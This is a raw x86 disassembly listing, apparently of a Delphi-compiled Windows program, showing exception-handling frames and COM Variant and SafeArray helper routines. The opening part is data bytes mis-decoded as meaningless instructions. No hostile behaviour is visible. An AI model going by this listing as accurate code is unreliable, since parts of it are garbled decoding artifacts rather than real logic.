add [ eax ] al
add ah ch
imul esp [ ecx + 0x6e ] 0x766e4974
popad
inc eax
add [ eax + ecx * 2 + 0x48a00040 ] ch
inc eax
add al ch
inc ebp
inc eax
add [ esi + eax * 2 ] al
inc eax
add [ eax + 0x46 ] al
inc eax
add [ 0x72615645 ] dl
or eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov [ ebx ] cl
inc ecx
add [ eax + eax ] cl
add [ eax ] al
push 0x98004093
dec eax
inc eax
add [ eax + ecx * 2 + 0x48a80040 ] ah
outsd
jb r-xdata
call 0x4414d5e
inc esi
outsd
inc eax
add [ eax + 0x46 ] al
inc eax
add [ eax ] bl
inc ebp
push esi
popad
jb r-xdata
inc eax
add [ eax ] ah
or eax 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and [ 0xc0041 ] cl
popad
jb r-xdata
popad
jns r-xdata
outsb
je r-xdata
popad
outsb
je r-xdata
inc eax
add al ch
inc ebp
inc eax
add [ esi + eax * 2 ] al
insd
inc eax
add [ eax + ecx * 2 + 0x48a00040 ] ch
inc eax
add al ch
jb r-xdata
add [ eax ] al
push 0x98004093
dec eax
inc eax
add [ eax + ecx * 2 + 0x48a80040 ] ah
inc eax
add [ eax + ecx * 2 + 0x48a00040 ] ch
add [ eax ] al
jb r-xdata
add al ch
inc ebp
inc eax
add [ esi + eax * 2 ] al
inc eax
add [ eax + 0x46 ] al
inc eax
add [ eax ] bl
inc ebp
push esi
popad
jb r-xdata
outsd
arpl [ ebx + 0x65 ] bp
inc ebp
jb r-xdata
add [ eax + 0x46 ] al
inc eax
add [ 0x72615645 ] dl
imul esp [ ecx + 0x6e ] 0x73694474
jo r-xdata
outsb
js r-xdata
dec eax
inc eax
add al ch
jne r-xdata
jb r-xdata
inc ebp
jo r-xdata
popad
je r-xdata
inc ebp
inc eax
add [ esi + eax * 2 ] al
inc eax
add [ eax + 0x46 ] al
inc eax
add [ eax * 2 + 0x69726156 ] dl
inc eax
add [ esp + ecx + 0x41 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov esp 0xc00410c
add [ eax ] al
add [ eax - 0x6d ] ch
inc eax
add [ eax - 0x5bffbfb8 ] bl
dec eax
inc eax
add [ eax - 0x53ffbfb8 ] ch
dec eax
inc eax
add [ eax - 0x17ffbfb8 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ecx + 0xc0041 ] bh
add [ eax ] al
push 0x98004093
dec eax
inc eax
outsd
jb r-xdata
add esp 0xffffffe4
push ebx
je r-xdata
in al dx
arpl [ gs : ebp + 0x64 ] si
inc ebp
jb r-xdata
jae r-xdata
popad
in al dx
dec edi
dec bp
insd
outsd
jb r-xdata
je r-xdata
inc ebp
inc eax
add [ esi + eax * 2 ] al
inc eax
add [ eax + 0x46 ] al
inc eax
add [ edi ] dl
inc ebp
push esi
popad
jb r-xdata
inc eax
add [ eax + 0x410d ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc00410d ] cl
add [ eax ] al
add [ eax - 0x6d ] ch
inc eax
add [ eax - 0x5bffbfb8 ] bl
dec eax
inc eax
add [ eax - 0x53ffbfb8 ] ch
dec eax
inc eax
add [ eax - 0x17ffbfb8 ] ah
outsd
jb r-xdata
jb r-xdata
inc ebp
jb r-xdata
add [ eax + eax ] cl
add [ eax ] al
push 0x98004093
dec eax
inc eax
inc eax
add [ esp + ecx + 0x41 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ecx + 0x41 ] dl
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov esi edx
mov ebx eax
push 0x6f727245
jb r-xdata
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_407550
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dafc
call sub_404ec4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410e55
lea eax [ ebp - 0x4 ]
call sub_405530
retn
add [ edi + edi * 8 + 0x30 ] ah
outsd
jb r-xdata
xor eax eax
push ebp
push sub_410ee7
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_415d1c
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_415d1c
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_407550
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40db38
call sub_404ec4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410eee
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_405554
retn
dec ebp
in al 0x8b
mov ebx eax
popad
or eax 0xc0041
add [ eax ] al
push 0x98004093
dec eax
inc eax
add [ eax + ecx * 2 + 0x48a80040 ] ah
inc eax
add [ eax + ecx * 2 + 0x48a00040 ] ch
inc eax
add al ch
inc ebp
inc eax
add [ esi + eax * 2 ] al
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ch
inc ebp
jb r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
or eax 0xc0041
outsd
push 0x0
xor eax eax
push ebp
push sub_410e4e
push [ fs : eax ]
rcl [ ebp - 0x75 ] 0xec
imul esp [ ecx + 0x6e ] 0x656e5574
js r-xdata
or eax 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al dx
add [ eax ] al
add [ eax ] al
outsd
popad
jns r-xdata
sub_410e04
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_410e4e
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_407550
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dafc
call sub_404ec4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410e55
lea eax [ ebp - 0x4 ]
call sub_405530
retn
sub_410e58
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_410ee7
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_415d1c
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_415d1c
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_407550
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40db38
call sub_404ec4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410eee
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_405554
retn
sub_410ef4
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_410f3e
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_407550
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dafc
call sub_404ec4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410f45
lea eax [ ebp - 0x4 ]
call sub_405530
retn
sub_410f48
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_410fd7
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_415d1c
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_415d1c
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_407550
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40db38
call sub_404ec4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410fde
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_405554
retn
sub_410fe4
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_41102e
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_407550
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dafc
call sub_404ec4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_411035
lea eax [ ebp - 0x4 ]
call sub_405530
retn
sub_411038
push ebp
mov ebp esp
mov ecx 0x8
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_41127d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
cmp eax 0x8002000a
jg r-xdata
sub eax 0x8002000b
je r-xdata
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_407550
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dafc
call sub_404ec4
jmp r-xdata
sub eax 0x2
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_407550
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dafc
call sub_404ec4
jmp r-xdata
cmp eax 0x80020005
jg r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_411284
lea eax [ ebp - 0x40 ]
mov edx 0x2
call sub_405554
lea eax [ ebp - 0x20 ]
mov edx 0x8
call sub_405554
retn
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_407550
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dafc
call sub_404ec4
jmp r-xdata
sub eax 0x50001
je r-xdata
sub eax 0x80020008
je r-xdata
je r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_407550
mov ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dafc
call sub_404ec4
jmp r-xdata
sub eax 0x49
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_407550
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dafc
call sub_404ec4
jmp r-xdata
dec eax
je r-xdata
call sub_410e04
jmp r-xdata
sub eax 0x80004001
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_407550
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dafc
call sub_404ec4
jmp r-xdata
jmp r-xdata
call sub_410ef4
jmp r-xdata
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_407550
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dafc
call sub_404ec4
jmp r-xdata
sub eax 0xbffe
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] 0xb
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x2c ] 0x0
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_40d2e8
mov eax [ ebp - 0x3c ]
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] 0xb
lea eax [ ebp - 0x38 ]
push eax
push 0x2
lea edx [ ebp - 0x40 ]
mov eax [ rw-data ]
call sub_407550
mov ecx [ ebp - 0x40 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40db38
call sub_404ec4
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_407550
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dafc
call sub_404ec4
jmp r-xdata
jmp r-xdata
sub_411298
push ebx
test eax eax
je r-xdata
pop ebx
retn
mov ebx eax
sub ebx 0x80020005
je r-xdata
mov eax edx
mov edx ecx
call sub_410e58
jmp r-xdata
sub ebx 0x5
je r-xdata
mov eax edx
mov edx ecx
call sub_410f48
jmp r-xdata
jmp r-xdata
call sub_411038
sub_4112cc
push ebx
push esi
mov esi edx
mov ebx eax
call sub_402f84
mov edx [ r-xdata ]
call sub_4047dc
test al al
je r-xdata
call sub_402f84
mov edx [ r-xdata ]
call sub_4047dc
test al al
je r-xdata
mov ecx esi
mov edx ebx
mov eax 0x8002000a
call sub_411298
pop esi
pop ebx
retn
call sub_402f84
mov edx [ r-xdata ]
call sub_4047dc
test al al
je r-xdata
mov ecx esi
mov edx ebx
mov eax 0x8002000a
call sub_411298
jmp r-xdata
call sub_402fc4
mov edx eax
mov eax edx
call sub_404ec4
mov ecx esi
mov edx ebx
mov eax 0x80020005
call sub_411298
jmp r-xdata
pop esi
pop ebx
retn
sub_411350
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_41139a
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_407550
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dafc
call sub_404ec4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4113a1
lea eax [ ebp - 0x4 ]
call sub_405530
retn
sub_4113b8
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
add ecx 0xfffffd00
mov eax edx
pop ebx
pop ebp
retn
test eax eax
jge r-xdata
mov edx [ ecx + eax * 8 + 0x4 ]
add edx [ ecx + eax * 8 ]
mov ebx [ ebp + 0x8 ]
cmp edx [ ebx + eax * 4 - 0x100 ]
setg dl
dec eax
test dl dl
je r-xdata
sub_4113e8
push ebp
mov ebp esp
push ebx
push esi
mov dl 0x1
mov ecx [ ebp + 0x8 ]
inc [ ecx + eax * 4 - 0x100 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + eax * 8 - 0x2fc ]
mov ebx ecx
mov esi [ ebp + 0x8 ]
add ebx [ esi + eax * 8 - 0x300 ]
mov esi [ ebp + 0x8 ]
cmp ebx [ esi + eax * 4 - 0x100 ]
jg r-xdata
mov eax edx
pop esi
pop ebx
pop ebp
retn
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx + eax * 4 - 0x100 ] ecx
mov edx [ ebp + 0x8 ]
push edx
dec eax
call sub_4113e8
pop ecx
mov edx eax
xor edx edx
jmp r-xdata
sub_411444
push ebp
mov ebp esp
add esp 0xfffffce8
push ebx
push esi
push edi
mov [ ebp - 0x304 ] eax
mov eax [ ebp - 0x304 ]
test [ eax + 0x1 ] 0x20
jne r-xdata
mov eax [ ebp - 0x304 ]
movzx eax [ eax ]
mov edx eax
and dx 0xfff
cmp dx 0xc
jne r-xdata
mov eax 0x80070057
call sub_41128c
mov eax [ ebp - 0x304 ]
push eax
call VariantClear
call sub_41128c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x304 ]
test ah 0x40
je r-xdata
mov eax [ ebp - 0x304 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x308 ] eax
mov eax [ ebp - 0x304 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x308 ] eax
jmp r-xdata
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor edi edi
lea esi [ ebp - 0x300 ]
mov eax [ ebp - 0x308 ]
movzx eax [ eax ]
mov [ ebp - 0x310 ] eax
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
push ebp
mov ebx [ ebp - 0x310 ]
dec ebx
mov eax ebx
call sub_4113b8
pop ecx
test al al
je r-xdata
inc ebx
lea eax [ ebp - 0x2fc ]
lea edx [ ebp - 0x100 ]
mov eax esi
mov [ ebp - 0x318 ] eax
mov eax [ ebp - 0x318 ]
add eax 0x4
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x308 ]
push eax
call SafeArrayGetLBound
call sub_41128c
lea eax [ ebp - 0x30c ]
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x308 ]
push eax
call SafeArrayGetUBound
call sub_41128c
mov eax [ ebp - 0x318 ]
mov edx [ ebp - 0x30c ]
sub edx [ eax + 0x4 ]
inc edx
mov eax [ ebp - 0x318 ]
mov [ eax ] edx
inc edi
add esi 0x8
dec ebx
jne r-xdata
push ebp
mov eax ebx
call sub_4113e8
pop ecx
test al al
jne r-xdata
lea eax [ ebp - 0x314 ]
push eax
lea eax [ ebp - 0x100 ]
push eax
mov eax [ ebp - 0x308 ]
push eax
call SafeArrayPtrOfIndex
call sub_41128c
mov eax [ ebp - 0x314 ]
call sub_41163c
mov ecx [ eax ]
mov [ edx ] ecx
add edx 0x4
add eax 0x8
dec ebx
jne r-xdata
sub_4115c0
push ebx
push esi
push ecx
mov ebx eax
movzx esi [ ebx ]
cmp si 0x14
jae r-xdata
cmp si 0x100
jne r-xdata
push ebx
call VariantClear
call sub_41128c
jmp r-xdata
cmp si 0x101
jne r-xdata
mov [ ebx ] 0x0
lea eax [ ebx + 0x8 ]
call sub_405530
jmp r-xdata
pop edx
pop esi
pop ebx
retn
test si 0x2000
je r-xdata
mov eax ebx
call [ rw-data ]
jmp r-xdata
mov edx esp
mov eax esi
call sub_416178
test al al
je r-xdata
mov eax ebx
call sub_411444
jmp r-xdata
push ebx
call VariantClear
push ebx
call VariantInit
mov edx ebx
mov eax [ esp ]
mov ecx [ eax ]
call [ ecx + 0x24 ]
jmp r-xdata
sub_411658
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov ebx [ ebp + 0xc ]
cmp [ ebx ] 0x400c
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call sub_411658
add esp 0x10
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
lea eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub eax 0x4009
je r-xdata
je r-xdata
xor eax eax
push ebp
push sub_41174c
push [ fs : eax ]
mov [ fs : eax ] esp
movzx esi [ ebx ]
movzx eax si
cmp eax 0x101
jg r-xdata
cmp [ rw-data ] 0x0
je r-xdata
sub eax 0x4
jne r-xdata
sub eax 0x9
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
call [ rw-data ]
add esp 0x10
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_416178
test al al
je r-xdata
sub eax 0x4
je r-xdata
retn
mov eax [ ebp - 0x8 ]
mov edx eax
mov eax [ ebp + 0x8 ]
call sub_411a68
lea eax [ ebp - 0x18 ]
call sub_41163c
call sub_410ef4
mov eax [ ebp + 0x10 ]
push eax
lea eax [ ebp + 0x14 ]
push eax
mov ecx ebx
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
jmp r-xdata
jmp r-xdata
sub_41175c
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
add ecx 0xfffffd00
mov eax edx
pop ebx
pop ebp
retn
test eax eax
jge r-xdata
mov edx [ ecx + eax * 8 + 0x4 ]
add edx [ ecx + eax * 8 ]
mov ebx [ ebp + 0x8 ]
cmp edx [ ebx + eax * 4 - 0x100 ]
setg dl
dec eax
test dl dl
je r-xdata
sub_41178c
push ebp
mov ebp esp
push ebx
push esi
mov dl 0x1
mov ecx [ ebp + 0x8 ]
inc [ ecx + eax * 4 - 0x100 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + eax * 8 - 0x2fc ]
mov ebx ecx
mov esi [ ebp + 0x8 ]
add ebx [ esi + eax * 8 - 0x300 ]
mov esi [ ebp + 0x8 ]
cmp ebx [ esi + eax * 4 - 0x100 ]
jg r-xdata
mov eax edx
pop esi
pop ebx
pop ebp
retn
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx + eax * 4 - 0x100 ] ecx
mov edx [ ebp + 0x8 ]
push edx
dec eax
call sub_41178c
pop ecx
mov edx eax
xor edx edx
jmp r-xdata
sub_4117e8
push ebp
mov ebp esp
add esp 0xfffffce0
push ebx
push esi
push edi
mov [ ebp - 0x308 ] ecx
mov ebx edx
mov [ ebp - 0x304 ] eax
test [ ebx + 0x1 ] 0x20
jne r-xdata
movzx eax [ ebx ]
mov edx eax
and dx 0xfff
cmp dx 0xc
jne r-xdata
mov eax 0x80070057
call sub_41128c
push ebx
mov eax [ ebp - 0x304 ]
push eax
call VariantCopy
call sub_41128c
test ah 0x40
je r-xdata
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x314 ] eax
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x314 ] eax
jmp r-xdata
lea eax [ ebp - 0x300 ]
push eax
mov eax [ ebp - 0x310 ]
push eax
push 0xc
call SafeArrayCreate
mov esi eax
test esi esi
jne r-xdata
inc ebx
xor edi edi
lea esi [ ebp - 0x300 ]
mov eax [ ebp - 0x314 ]
movzx eax [ eax ]
mov [ ebp - 0x310 ] eax
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x304 ]
call sub_41163c
mov eax [ ebp - 0x304 ]
mov [ eax ] 0x200c
mov eax [ ebp - 0x304 ]
mov [ eax + 0x8 ] esi
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
call sub_410fe4
mov eax esi
mov [ ebp - 0x320 ] eax
mov eax [ ebp - 0x320 ]
add eax 0x4
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayGetLBound
call sub_41128c
lea eax [ ebp - 0x30c ]
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayGetUBound
call sub_41128c
mov eax [ ebp - 0x320 ]
mov edx [ ebp - 0x30c ]
sub edx [ eax + 0x4 ]
inc edx
mov eax [ ebp - 0x320 ]
mov [ eax ] edx
inc edi
add esi 0x8
dec ebx
jne r-xdata
push ebp
mov ebx [ ebp - 0x310 ]
dec ebx
mov eax ebx
call sub_41175c
pop ecx
test al al
je r-xdata
inc ebx
lea eax [ ebp - 0x2fc ]
lea edx [ ebp - 0x100 ]
push ebp
mov eax ebx
call sub_41178c
pop ecx
test al al
jne r-xdata
lea eax [ ebp - 0x318 ]
push eax
lea eax [ ebp - 0x100 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayPtrOfIndex
call sub_41128c
lea eax [ ebp - 0x31c ]
push eax
lea eax [ ebp - 0x100 ]
push eax
push esi
call SafeArrayPtrOfIndex
call sub_41128c
mov eax [ ebp - 0x318 ]
mov edx eax
mov eax [ ebp - 0x31c ]
call [ ebp - 0x308 ]
mov ecx [ eax ]
mov [ edx ] ecx
add edx 0x4
add eax 0x8
dec ebx
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4119bc
push ebx
push esi
push edi
push ecx
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
movzx edi [ esi ]
cmp di 0x14
jae r-xdata
mov eax ebx
call sub_4115c0
cmp di 0x100
jne r-xdata
push esi
push ebx
call VariantCopy
call sub_41128c
jmp r-xdata
cmp di 0x101
jne r-xdata
mov [ ebx ] 0x100
xor eax eax
mov [ ebx + 0x8 ] eax
lea eax [ ebx + 0x8 ]
mov edx [ esi + 0x8 ]
call sub_405584
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
test di 0x2000
je r-xdata
mov [ ebx ] di
mov eax [ esi + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax ebx
call [ rw-data ]
jmp r-xdata
mov edx esp
mov eax edi
call sub_416178
test al al
je r-xdata
mov ecx sub_4119b4
mov edx esi
mov eax ebx
call sub_4117e8
jmp r-xdata
push esi
push ebx
call VariantCopy
call sub_41128c
push 0x0
mov ecx esi
mov edx ebx
mov eax [ esp + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x28 ]
jmp r-xdata
sub_411a68
push ebx
push esi
mov ebx edx
mov esi eax
cmp esi ebx
je r-xdata
pop esi
pop ebx
retn
test [ ebx ] 0xbfe8
jne r-xdata
mov edx ebx
mov eax esi
call sub_4119bc
test [ esi ] 0xbfe8
je r-xdata
mov eax [ ebx ]
mov [ esi ] eax
mov eax [ ebx + 0x4 ]
mov [ esi + 0x4 ] eax
mov eax [ ebx + 0x8 ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0xc ]
mov [ esi + 0xc ] eax
jmp r-xdata
mov eax esi
call sub_4115c0
sub_411aac
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_411b08
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
lea eax [ ebp - 0x10 ]
call sub_411a68
lea eax [ ebp - 0x10 ]
call [ rw-data ]
movzx ecx di
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_411d34
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_411b0f
lea eax [ ebp - 0x10 ]
call sub_41163c
retn
sub_411b18
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_411b56
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_415164
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_415b08
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_411b5d
lea eax [ ebp - 0x4 ]
call sub_405d28
retn
sub_411b64
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_411ba2
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_414a44
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_415adc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_411ba9
lea eax [ ebp - 0x4 ]
call sub_405530
retn
sub_411bb0
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_411bee
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_4157fc
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_415b6c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_411bf5
